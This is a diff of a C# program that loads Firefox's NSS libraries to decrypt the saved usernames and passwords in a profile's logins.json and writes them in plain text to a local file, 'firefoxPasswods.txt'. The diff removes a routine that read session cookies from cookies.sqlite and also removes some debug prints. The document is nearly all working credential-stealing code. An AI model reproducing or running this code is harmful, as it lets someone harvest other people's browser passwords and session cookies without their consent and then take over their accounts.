@@ -4,10 +4,8 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading.Tasks;
 
 namespace firefox
 {
@@ -22,7 +20,6 @@ namespace firefox
         private static DirectoryInfo firefoxProfilePath;
 
         private static FileInfo firefoxLoginFile;
-        private static FileInfo firefoxCookieFile;
 
         static Firefox()
         {
@@ -39,9 +36,6 @@ namespace firefox
             if (firefoxLoginFile == null)
                 throw new NullReferenceException("Firefox does not have any logins.json file");
 
-            firefoxCookieFile = GetFile(firefoxProfilePath, "cookies.sqlite");
-            if (firefoxCookieFile == null)
-                throw new NullReferenceException("Firefox does not have any cookie file");
 
         }
 
@@ -71,66 +65,14 @@ namespace firefox
             {
                 string username = Decrypt(data.encryptedUsername);
                 string password = Decrypt(data.encryptedPassword);
-                Console.WriteLine("usr - " + data.encryptedUsername + "  pwd " + data.encryptedPassword);
-                Console.WriteLine("usr - " + username + "  pwd " + password);
                 Uri host = new Uri(data.formSubmitURL);
-
-                firefoxPasswords.Add(new FirefoxPassword() { Host = host, Username = username, Password = password });
+                FirefoxPassword f = new FirefoxPassword() { Host = host, Username = username, Password = password };
+                firefoxPasswords.Add(f);               
             }
 
             return firefoxPasswords;
         }
-        /// <summary>
-        /// Recover Firefox Cookies from the SQLite3 Database
-        /// </summary>
-        /// <returns>List of Cookies found</returns>
-        public static List<FirefoxCookie> Cookies()
-        {
-            List<FirefoxCookie> data = new List<FirefoxCookie>();
-            SQLiteHandler sql = new SQLiteHandler(firefoxCookieFile.FullName);
-            if (!sql.ReadTable("moz_cookies"))
-                throw new Exception("Could not read cookie table");
-
-            int totalEntries = sql.GetRowCount();
-
-            for (int i = 0; i < totalEntries; i++)
-            {
-                try
-                {
-                    string h = sql.GetValue(i, "host");
-                    //Uri host = new Uri(h);
-                    string name = sql.GetValue(i, "name");
-                    string val = sql.GetValue(i, "value");
-                    string path = sql.GetValue(i, "path");
-
-                    bool secure = sql.GetValue(i, "isSecure") == "0" ? false : true;
-                    bool http = sql.GetValue(i, "isSecure") == "0" ? false : true;
-
-                    // if this fails we're in deep shit
-                    long expiryTime = long.Parse(sql.GetValue(i, "expiry"));
-                    long currentTime = ToUnixTime(DateTime.Now);
-                    DateTime exp = FromUnixTime(expiryTime);
-                    bool expired = currentTime > expiryTime;
-
-                    data.Add(new FirefoxCookie()
-                    {
-                        Host = h,
-                        ExpiresUTC = exp,
-                        Expired = expired,
-                        Name = name,
-                        Value = val,
-                        Path = path,
-                        Secure = secure,
-                        HttpOnly = http
-                    });
-                }
-                catch (Exception)
-                {
-                    return data;
-                }
-            }
-            return data;
-        }
+       
         #endregion
 
         #region Functions
@@ -142,7 +84,6 @@ namespace firefox
             LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
             LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
             nssModule = LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
-            Console.WriteLine(" ptr library nss3- > " + nssModule);
             IntPtr pProc = GetProcAddress(nssModule, "NSS_Init");
             NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
             NSS_Init(firefoxProfilePath.FullName);
@@ -342,7 +283,6 @@ namespace firefox
         private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
         {
             IntPtr pProc = GetProcAddress(nssModule, "PK11SDR_Decrypt");
-            Console.WriteLine(" ptr pk11dr - > " +pProc);
             PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
             return ptr(ref data, ref result, cx);
         }
@@ -350,7 +290,6 @@ namespace firefox
         {
             StringBuilder sb = new StringBuilder(cypherText);
             int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
-            Console.WriteLine(" decode b64 -> " + hi2);
             TSECItem tSecDec = new TSECItem();
             TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
             var res = PK11SDR_Decrypt(ref item, ref tSecDec, 0);
@@ -363,8 +302,6 @@ namespace firefox
                     return Encoding.UTF8.GetString(bvRet);
                 }
             }
-            Console.WriteLine(" PK11SDR_Decrypt " + res );
-            Console.WriteLine(" item " + item.SECItemData);
             return null;
         }
         #endregion
@@ -379,29 +316,24 @@ namespace firefox
             return string.Format("User: {0}{3}Pass: {1}{3}Host: {2}", Username, Password, Host.Host, Environment.NewLine);
         }
     }
-    public class FirefoxCookie
-    {
-        public string Host { get; set; }
-        public string Name { get; set; }
-        public string Value { get; set; }
-        public string Path { get; set; }
-        public DateTime ExpiresUTC { get; set; }
-        public bool Secure { get; set; }
-        public bool HttpOnly { get; set; }
-        public bool Expired { get; set; }
-
-        public override string ToString()
-        {
-            return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, Host, Name, Value, Path, Expired, HttpOnly, Secure);
-        }
-    }
 
     public class Ejecuta {
+
+        public static void toFile(string name, List<FirefoxPassword> list) {
+            using (System.IO.StreamWriter file =
+            new System.IO.StreamWriter(name, true))
+            {
+                foreach (FirefoxPassword pass in list)
+                {
+                    // If the line doesn't contain the word 'Second', write the line to the file.
+                        file.WriteLine(pass.ToString());
+                    }
+            }
+        }
+
         public static void Main() {
-            List<FirefoxCookie> firefoxCookies = Firefox.Cookies();
             List<FirefoxPassword> firefoxPasswords = Firefox.Passwords();
-            Console.WriteLine(firefoxPasswords.ToString());
-            Console.Read();
+            toFile("firefoxPasswods.txt",firefoxPasswords);
         } 
 
     }
